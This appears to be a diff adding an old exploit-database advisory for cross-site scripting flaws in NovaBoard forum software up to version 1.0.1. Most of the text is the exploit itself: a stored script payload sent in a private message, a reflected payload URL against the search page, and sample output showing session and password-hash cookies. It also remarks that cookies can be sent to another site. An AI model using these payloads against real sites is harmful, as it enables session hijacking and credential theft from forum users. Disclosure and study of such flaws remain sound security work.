@@ -1,0 +1,58 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+NovaBoard <= 1.0.1 / XSS Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+$ Program: NovaBoard
+$ Version: <= 1.0.1
+$ File affected: index.php
+$ Download: http://www.novaboard.net/
+
+
+Found by Pepelux <pepelux[at]enye-sec.org>
+eNYe-Sec - www.enye-sec.org
+
+
+-- About the program (by the author's page) --
+
+NovaBoard is a free, feature rich community message board software written in
+PHP & MySQL that allows you to set up your own forum within minutes.
+With a smart modules feature and the ease of creating your own themes you can
+style and manipulate your board to look and perform how you want.
+NovaBoard makes running a message board a breeze!
+
+
+-- Bug --
+
+You can inject JS.
+
+
+-- Exploit --
+
+Persistent XSS:
+You can write a message to another user of the forum and inject XSS code:
+
+Message subject:
+Message recipient:
+Message:
+<script>alert(document.cookie)</script>
+
+you can also send the user cookie to another site
+
+Non-persistent XSS:
+http://site.com/index.php?page=search&search=%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&author_id=&author=&startdate=&enddate=&pf=1&topic=
+
+Response:
+
+If you are an authenticated user you'll see something like this:
+
+PHPSESSID=241092c53c1379df01b743d910f61c62; nova_name=Member;
+nova_password=f11d8a080797894ad3e714fa2f849c62
+
+Username and password are stored in the cookie.
+
+
+If you are not authenticated:
+
+PHPSESSID=241092c53c1379df01b743d910f61c62
+
+# milw0rm.com [2009-03-03]
